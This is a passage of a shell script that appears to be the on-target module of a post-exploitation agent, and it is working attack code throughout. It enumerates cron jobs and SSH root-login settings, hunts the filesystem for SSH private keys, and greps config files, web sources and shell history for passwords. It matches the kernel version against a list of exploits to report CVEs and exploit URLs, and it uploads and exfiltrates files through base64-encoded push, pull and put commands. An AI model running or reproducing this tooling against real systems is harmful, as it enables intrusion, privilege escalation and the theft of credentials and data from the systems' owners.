        fi
        if [ -n "$CROND" ]; then
            append "CRON.D" "$(printf %b "$CROND")"
        else
            append "CRON.D" "No"
        fi
        RET=$(find /etc/cron.hourly -type f -printf '%M %u %g %p\n' 2>/dev/null)
        if success; then
            append "HOURLY" "$RET"
        else
            append "HOURLY" "No"
        fi
        RET=$(find /etc/cron.daily -type f -printf '%M %u %g %p\n' 2>/dev/null)
        if success; then
            append "DAILY" "$RET"
        else
            append "DAILY" "No"
        fi
        RET=$(find /etc/cron.weekly -type f -printf '%M %u %g %p\n' 2>/dev/null)
        if success; then
            append "WEEKLY" "$RET"
        else
            append "WEEKLY" "No"
        fi
        RET=$(find /etc/cron.monthly -type f -printf '%M %u %g %p\n' 2>/dev/null)
        if success; then
            append "MONTHLY" "$RET"
        else
            append "MONTHLY" "No"
        fi
        RET=$(find /etc/cron.allow -type f -printf '%M %u %g %p\n' 2>/dev/null)
        if success; then
            ALLOW=$(cat /etc/cron.allow 2>/dev/null | grep -Ev "#|^$")
            if [ $? -eq 0 ] && [ -n "$ALLOW" ]; then
                append "ALLOW" "$(printf %b "$RET\n \n$ALLOW\n \n")"
            else
                append "ALLOW" "$RET"
            fi
        else
            append "ALLOW" "No"
        fi
        RET=$(find /etc/cron.deny -type f -printf '%M %u %g %p\n' 2>/dev/null)
        if success; then
            DENY=$(cat /etc/cron.deny 2>/dev/null | grep -Ev "#|^$")
            if [ $? -eq 0 ] && [ -n "$DENY" ]; then
                append "DENY" "$(printf %b "$RET\n \n$DENY\n \n")"
            else
                append "DENY" "$RET"
            fi
        else
            append "DENY" "No"
        fi

        append "SSH"

        RET=$(grep -i "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | awk '{print $2}')
        if [ "$RET" = "Yes" ] || [ "$RET" = "yes" ]; then
            append "ROOT" "Yes"
        else
            append "ROOT" "No"
        fi
        RET=$(find / \( -name "*id_dsa*" -o -name "*id_rsa*" -o -name "*dsa_key*" -o -name "*rsa_key*"\
              -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" \) -type f\
              -printf '%M %u %g %p\n' 2>/dev/null)
        if [ -n "$RET" ]; then
            append "KEYS" "$RET"
        else
            append "KEYS" "No"
        fi
        
        append "CREDENTIALS"

        RET=$(find / -maxdepth 4 \( -name "*.txt" -o -name "*.conf" -o -name "*.xml" -o -name "*.yml" -o -name "*.html" -o -name "*.js"\
              -o -name "*.php" -o -name "*.db" -o -name ".bash_history" \) -type f\
              -exec grep -Elisq\
              'pass=|pwd=|login=|luser=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:' {} 2>/dev/null \;\
              -printf '%M %u %g %p\n')
        if [ -n "$RET" ]; then
            append "NULL" "$RET"
        else
            append "NULL" "No"
        fi
        
        CACHE_PE="$BUFFER\n"

        print "$BUFFER\n"
    else
        print "$CACHE_PE"
    fi
}

show_cve()
{
    if [ -z "$CACHE_CVE" ]; then
        RET=$(uname -a 2>/dev/null | awk '{print $3}' | cut -d '-' -f 1)
        if success; then
            KERNEL="$RET"
        fi
        RET=$(zcat /proc/config.gz 2>/dev/null)
        if success; then
            CONFIG="$RET"
        else
            RET=$(cat /boot/config-"$(uname -r)" 2>/dev/null)
            if success; then
                CONFIG="$RET"
            else
                RET=$(cat "${KBUILD_OUTPUT:-/usr/src/linux}"/.config 2>/dev/null)
                if success; then
                    CONFIG="$RET"
                fi
            fi
        fi
        RET=$(sysctl -a 2>/dev/null)
        if success; then
            SYSCTL="$RET"
        fi
        RET=$(uname -m 2>/dev/null)
        if success; then
            if echo "$RET" | grep -q "64"; then
                ARCH="x86_64"
            else
                ARCH="x86"
            fi
        fi

        if [ -n "$KERNEL" ]; then
            append "CVE"

            MATCH=1
            for EXPLOIT in $EXPLOITS; do
                IFS='|'
                I=1
                VULNERABLE=1
                for DATA in $EXPLOIT; do
IFS='
'
                    if [ $I -eq 1 ]; then
                        CVE=$(printf %b "$DATA")
                    elif [ $I -eq 2 ]; then
                        V1=$(printf "$DATA" | cut -d- -f1)
                        V2=$(printf "$DATA" | cut -d- -f2)
                        if [ "$V1" = "$V2" ]; then
                            if [ "$KERNEL" = "$V1" ]; then
                                VERSIONS="$DATA"
                                VULNERABLE=0
                            else
                                break
                            fi
                        else
                            if vge "$KERNEL" "$V1"; then
                                if vle "$KERNEL" "$V2"; then
                                    VERSIONS="$DATA"
                                    VULNERABLE=0
                                else
                                    break
                                fi
                            else
                                break
                            fi
                        fi
                    elif [ $I -eq 3 ]; then
                        if [ -n "$CONFIG" ] && [ -n "$DATA" ]; then
                            if ! echo "$CONFIG" | grep -q "$DATA"; then
                                VULNERABLE=1
                                break
                            fi
                        fi
                    elif [ $I -eq 4 ]; then
                        if [ -n "$SYSCTL" ] && [ -n "$DATA" ]; then
                            if ! echo "$SYSCTL" | grep -q "$DATA"; then
                                VULNERABLE=1
                                break
                            fi
                        fi
                    elif [ $I -eq 5 ]; then
                        if [ -n "$ARCH" ] && [ -n "$DATA" ]; then
                            if [ "$ARCH" != "$DATA" ]; then
                                VULNERABLE=1
                                break
                            fi
                        fi
                    elif [ $I -eq 6 ]; then
                        URL=$(printf %b "$DATA")
                    elif [ $I -eq 7 ]; then
                        if [ -n "$DATA" ]; then
                            NOTE="$DATA\n"
                        else
                            NOTE=""
                            URL="$URL\n"
                        fi
                    fi
                    I=$(( I + 1 ))
                done
                if [ $VULNERABLE -eq 0 ]; then
                    append "CVE" "$CVE"
                    append "KERNEL" "$VERSIONS"
                    append "EXPLOIT" "$URL"
                    if [ -n "$NOTE" ]; then
                        append "NOTE" "$NOTE"
                    fi
                    MATCH=0
                fi
            done
        fi

        if [ $MATCH -eq 0 ]; then
            CACHE_CVE="$BUFFER\n"
            print "$BUFFER\n"
        else
            print "\n"
        fi
    else
        print "$CACHE_CVE"
    fi
}

push()
{
    $(echo "$1" | base64 -d > "$2" 2>/dev/null)

    if [ $? -eq 0 ]; then
        print "$EOF"
    else
        print "$EOF"
        sleep 1
        print "$ERR"
    fi
}

pull()
{
    RET=$(cat "$1" | base64 -w0 2>/dev/null)

    if success; then
        [ "${-##*i*}" ] || print "$2\n$RET\n[PULL]$EOF"
        [ "${-##*i*}" ] && print " \n$2\n$RET\n[PULL]$EOF"
    else
        print "$EOF"
        sleep 1
        print "$ERR"
    fi
}

put()
{
    $(echo "$1" | base64 -d | tar -xz -C "$2" 2>/dev/null)

    if [ $? -eq 0 ]; then
        print "$EOF"
    else
        print "$EOF"
        sleep 1
        print "$ERR"
    fi
}

post()
{
    BUFFER=""

    if [ "$1" = "show" ]; then
        if [ "$2" = "system" ]; then
            show_system
        elif [ "$2" = "users" ]; then
            show_users
        elif [ "$2" = "process" ]; then
            show_process
        elif [ "$2" = "network" ]; then
            show_network
        elif [ "$2" = "pe" ]; then
            show_pe
        elif [ "$2" = "cve" ]; then
            show_cve
        else
            print "$HELP"
        fi
    elif [ "$1" = "push" ]; then
        push "$2" "$3"
    elif [ "$1" = "pull" ]; then
        pull "$2" "$3"
    elif [ "$1" = "put" ]; then
        put "$2" "$3"
    else
        print "$HELP"
    fi
}

print "$EOF"
